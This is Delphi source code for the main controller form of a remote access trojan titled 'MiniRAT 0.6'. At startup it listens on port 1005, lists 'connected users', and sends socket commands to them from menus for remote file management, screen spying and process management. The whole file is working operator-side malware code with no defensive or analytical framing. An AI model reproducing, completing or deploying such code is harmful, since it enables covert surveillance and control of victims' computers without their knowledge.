
unit MainU;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls,userv, XPMan, Buttons, PngBitBtn,
  Menus, ImgList, PngImageList,WinSock, uTransferView,uScreen, uProcess;

type
  TButton = class(StdCtrls.TButton)
    OwnedThread: TThread;
    ProgressBar: TProgressBar;
  end;
 
  TMainForm = class(TForm)
    lv1: TListView;
    XPManifest1: TXPManifest;
    PngBitBtn1: TPngBitBtn;
    PngBitBtn2: TPngBitBtn;
    PngBitBtn3: TPngBitBtn;
    edt1: TEdit;
    pm1: TPopupMenu;
    Filemanager1: TMenuItem;
    PngImageList1: TPngImageList;
    Processmanager1: TMenuItem;
    il1: TImageList;
    Screenspy1: TMenuItem;
    Windowmanager1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure PngBitBtn1Click(Sender: TObject);
    procedure PngBitBtn3Click(Sender: TObject);
    procedure Filemanager1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Screenspy1Click(Sender: TObject);
    procedure Processmanager1Click(Sender: TObject);
  private
  public
    
  end;

var
  MainForm: TMainForm;
  ListenThread: TMyThread;
  procedure StartListening(sPort:Integer);
implementation

uses uSettings, uFilemanager;

{$R *.dfm}
Function SendData(Sock: TSocket; Text: String): Integer;
Begin
  result := Send(Sock, Text[1], Length(Text), 0);
End;

procedure StartListening(sPort:Integer);
begin
if ListenThread <> nil then begin
ListenThread.Suspend;
ListenThread.Terminate;
Sleep(100);
end;
ListenThread := TMyThread.Create(True);
ListenThread.SetPortTo(sPort);
ListenThread.Resume;
end;
procedure TMainForm.FormCreate(Sender: TObject);
begin
MainForm.Caption := 'MiniRAT 0.6 - Connected Users: 0';
StartListening(1005);
end;

procedure TMainForm.PngBitBtn1Click(Sender: TObject);
begin
form1.show;
end;

procedure TMainForm.PngBitBtn3Click(Sender: TObject);
begin

end;

//thanks to the Coders of Coolvibes for this great function
procedure TMainForm.Filemanager1Click(Sender: TObject);
var
  nFileman :TForm2;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[0] = nil then begin
  nFileman := tform2.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Filemanager - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  nFileman.cbb1.Clear;
  lv1.Selected.SubItems.Objects[0] := nFileman;
end else begin
   TForm2(lv1.Selected.SubItems.Objects[0]).Show;
   TForm2(lv1.Selected.SubItems.Objects[0]).cbb1.Clear;
end;
if SendData(StrToInt(lv1.Selected.SubItems.Strings[0]),'12 1'#10) = SOCKET_ERROR then begin
   lv1.Selected.Delete;
   MainForm.Caption := 'MiniRAT 0.6 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
end;
end;
procedure TMainForm.FormShow(Sender: TObject);
begin
Form3.Show;
end;

procedure TMainForm.Screenspy1Click(Sender: TObject);
var
  nFileman :TForm4;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[1] = nil then begin
  nFileman := tform4.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Screenspy - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[1] := nFileman;
end else begin
   TForm4(lv1.Selected.SubItems.Objects[1]).Show;
end;
end;

procedure TMainForm.Processmanager1Click(Sender: TObject);
var
  nFileman :TForm5;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[2] = nil then begin
  nFileman := tform5.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Processmanager - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[2] := nFileman;
end else begin
   TForm4(lv1.Selected.SubItems.Objects[2]).Show;
end;
end;

end.


